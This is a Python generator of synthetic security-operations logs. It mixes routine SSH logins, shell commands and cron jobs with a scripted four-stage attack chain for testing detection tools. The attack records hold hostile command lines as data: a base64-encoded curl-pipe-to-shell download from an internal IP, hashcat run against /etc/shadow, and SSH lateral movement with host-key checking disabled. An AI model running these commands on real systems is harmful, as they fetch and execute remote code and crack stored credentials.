"""Synthetic enterprise + multi-stage attack log generator.

Generates realistic multi-day benign enterprise activity (routine SSH admin
logins, cron backups, standard user workstation processes) injected with a
realistic multi-stage attack sequence for benchmarking alert compression and
detection recall:

    Spearphishing Macro → Encoded PowerShell → Credential Dumping → Lateral Movement
"""

from __future__ import annotations

import argparse
import base64
import json
import random
import sys
from dataclasses import asdict
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import List, Optional, Sequence, Union

if __package__ in (None, ""):  # allow `python scripts/generate_soc_logs.py`
    sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from core.parser import LogEvent, parse_timestamp

# ---------------------------------------------------------------------------
# Benign enterprise activity
# ---------------------------------------------------------------------------

_BENIGN_CMDS = [
    "tail -n 50 /var/log/syslog",
    "grep ERROR /var/log/syslog",
    "systemctl status auditd",
    "ls -la /var/log",
    "df -h /var",
    "uptime",
    "python3 /opt/monitor.py --check",
    "sudo tail -n 20 /var/log/auth.log",
]

_CRON_JOBS = [
    ("root", "/usr/bin/db_backup.sh"),
    ("root", "/usr/bin/log_rotate.sh"),
    ("root", "/usr/bin/stat_collector.py"),
    ("deployer", "/usr/local/bin/deploy_lock.sh"),
]


class HostSpec:
    """A host with a list of plausible local users."""

    def __init__(self, name: str, users: Optional[List[str]] = None):
        self.name = name
        self.users = users or ["ubuntu"]


def default_hosts() -> List[HostSpec]:
    return [
        HostSpec("web-01", ["ubuntu", "deployer"]),
        HostSpec("db-02", ["ubuntu", "admin"]),
        HostSpec("app-03", ["ubuntu", "deployer"]),
    ]


def _iso(ts: datetime) -> str:
    return ts.astimezone(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")


def _rand_ts(rng: random.Random, start: datetime, days: int) -> datetime:
    span_h = max(days, 1) * 24
    return start + timedelta(hours=rng.uniform(0, span_h), minutes=rng.uniform(0, 60))


def _event_ssh_login(rng: random.Random, host: HostSpec, ts: datetime) -> LogEvent:
    user = rng.choice(host.users)
    src_ip = f"10.0.0.{rng.randrange(2, 250)}"
    port = rng.randrange(10000, 60000)
    return LogEvent(
        timestamp=_iso(ts),
        entity_host=host.name,
        entity_user=user,
        process_name="sshd",
        parent_process="init",
        command_line="/usr/sbin/sshd",
        src_ip=src_ip,
        raw_message=f"Accepted publickey for {user} from {src_ip} port {port} ssh2",
        source_format="auth.log",
    )


def _event_benign_shell(rng: random.Random, host: HostSpec, ts: datetime) -> LogEvent:
    user = rng.choice(host.users)
    cmd = rng.choice(_BENIGN_CMDS)
    parent = rng.choice(["sshd", "init"])
    return LogEvent(
        timestamp=_iso(ts),
        entity_host=host.name,
        entity_user=user,
        process_name="bash",
        parent_process=parent,
        command_line=cmd,
        raw_message=cmd,
        source_format="auditd",
    )


def _event_cron_job(rng: random.Random, host: HostSpec, ts: datetime) -> LogEvent:
    user, path = rng.choice(_CRON_JOBS)
    pid = rng.randrange(100, 99999)
    return LogEvent(
        timestamp=_iso(ts),
        entity_host=host.name,
        entity_user=user,
        process_name="cron",
        parent_process="init",
        command_line=f"/usr/sbin/cron[{pid}]",
        raw_message=f"CRON[{pid}]: ({user}) CMD ({path})",
        source_format="auth.log",
    )


def _benign_events(
    rng: random.Random, hosts: Sequence[HostSpec], n_events: int, start: datetime, days: int
) -> List[LogEvent]:
    events: List[LogEvent] = []
    for _ in range(max(0, n_events)):
        ts = _rand_ts(rng, start, days)
        host = rng.choice(hosts)
        roll = rng.random()
        if roll < 0.45:
            events.append(_event_ssh_login(rng, host, ts))
        elif roll < 0.85:
            events.append(_event_benign_shell(rng, host, ts))
        else:
            events.append(_event_cron_job(rng, host, ts))
    return events


# ---------------------------------------------------------------------------
# Attack campaign: Spearphishing Macro → Encoded PowerShell → Credential
# Dumping → Lateral Movement
# ---------------------------------------------------------------------------

_STAGE2_PAYLOAD = base64.b64encode(b"curl -s http://10.0.0.66:8080/payload.sh | sh").decode()


def _attack_events(
    rng: random.Random, hosts: Sequence[HostSpec], start: datetime, days: int
) -> List[LogEvent]:
    t0 = start + timedelta(days=rng.randrange(0, max(1, days)), hours=rng.randrange(6, 18))
    return [
        # Stage 1: spearphishing macro — the user opens a malicious document.
        LogEvent(
            timestamp=_iso(t0),
            entity_host="web-01",
            entity_user="deployer",
            process_name="python3",
            parent_process="bash",
            command_line="/usr/bin/python3 /tmp/extract_macro.py /home/deployer/Downloads/Statement_2026.xlsm",
            raw_message="/usr/bin/python3 /tmp/extract_macro.py /home/deployer/Downloads/Statement_2026.xlsm",
            source_format="auditd",
        ),
        # Stage 2: encoded PowerShell-style execution (high-entropy payload).
        LogEvent(
            timestamp=_iso(t0 + timedelta(minutes=5)),
            entity_host="web-01",
            entity_user="deployer",
            process_name="bash",
            parent_process="python3",
            command_line=f"echo {_STAGE2_PAYLOAD} | base64 -d | bash",
            raw_message=f"echo {_STAGE2_PAYLOAD} | base64 -d | bash",
            src_ip="10.0.0.99",
            dst_ip="10.0.0.66",
            source_format="auditd",
        ),
        # Stage 3: credential dumping.
        LogEvent(
            timestamp=_iso(t0 + timedelta(minutes=9)),
            entity_host="web-01",
            entity_user="deployer",
            process_name="hashcat",
            parent_process="bash",
            command_line="sudo /usr/bin/hashcat -m 1000 /etc/shadow /usr/share/wordlists/rockyou.txt",
            raw_message="sudo /usr/bin/hashcat -m 1000 /etc/shadow /usr/share/wordlists/rockyou.txt",
            source_format="auditd",
        ),
        # Stage 4: lateral movement via SSH.
        LogEvent(
            timestamp=_iso(t0 + timedelta(minutes=12)),
            entity_host="web-01",
            entity_user="deployer",
            process_name="ssh",
            parent_process="bash",
            command_line="sudo /usr/bin/ssh -o StrictHostKeyChecking=no -p 22 ubuntu@10.0.0.77 'systemctl status auditd'",
            raw_message="sudo /usr/bin/ssh -o StrictHostKeyChecking=no -p 22 ubuntu@10.0.0.77 'systemctl status auditd'",
            src_ip="10.0.0.99",
            dst_ip="10.0.0.77",
            source_format="auditd",
        ),
    ]


# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------

def generate_soc_logs(
    days: int = 7,
    benign_count: int = 1200,
    attack: bool = True,
    seed: int = 42,
    output: Optional[str] = None,
) -> List[LogEvent]:
    """Generate a synthetic multi-day SOC log corpus (optionally + attack campaign).

    Writes the unified-schema JSONL file to ``output`` when given and returns
    the events sorted by timestamp.
    """
    rng = random.Random(seed)
    start = (
        datetime.now(timezone.utc)
        .replace(hour=0, minute=0, second=0, microsecond=0)
        - timedelta(days=days)
    )
    hosts = default_hosts()
    events = _benign_events(rng, hosts, benign_count, start, days)
    if attack:
        events.extend(_attack_events(rng, hosts, start, days))
    for ev in events:
        ev.epoch = parse_timestamp(ev.timestamp) or 0.0
    events.sort(key=lambda ev: ev.epoch)
    if output:
        write_jsonl(output, events)
    return events


def write_jsonl(path: Union[str, Path], events: Sequence[LogEvent]) -> Path:
    out = Path(path)
    if str(out.parent) not in ("", "."):
        out.parent.mkdir(parents=True, exist_ok=True)
    with out.open("w", encoding="utf-8") as fh:
        for ev in events:
            fh.write(json.dumps(asdict(ev), separators=(",", ":")) + "\n")
    return out


def main(argv: Optional[Sequence[str]] = None) -> int:
    parser = argparse.ArgumentParser(
        description="Generate synthetic SOC logs (benign + attack campaign)."
    )
    parser.add_argument("-o", "--output", default="simulated_soc_logs.jsonl")
    parser.add_argument("--benign-count", type=int, default=1200)
    parser.add_argument("--days", type=int, default=7)
    parser.add_argument("--no-attack", action="store_true", help="Generate benign logs only.")
    parser.add_argument("--seed", type=int, default=42)
    args = parser.parse_args(argv)
    events = generate_soc_logs(
        days=args.days,
        benign_count=args.benign_count,
        attack=not args.no_attack,
        seed=args.seed,
        output=args.output,
    )
    print(f"Generated {len(events)} events -> {args.output}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
